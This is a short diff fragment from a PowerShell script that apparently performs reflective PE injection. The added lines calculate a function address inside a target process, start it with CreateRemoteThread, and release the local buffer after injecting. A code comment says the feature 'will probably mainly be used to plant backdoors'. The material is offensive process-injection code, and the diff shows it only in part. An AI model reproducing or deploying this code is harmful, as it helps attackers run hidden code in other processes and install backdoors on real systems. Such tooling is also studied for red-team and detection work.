+			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
+			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+			
+			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+			$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]$VoidFuncAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+		}
 		
-		Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		#Don't free a library if it is injected in a remote process
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		}
+		else
+		{
+			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+			if ($Success -eq $false)
+			{
+				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
+			}
+		}
 		
 		Write-Verbose "Done!"
 	}
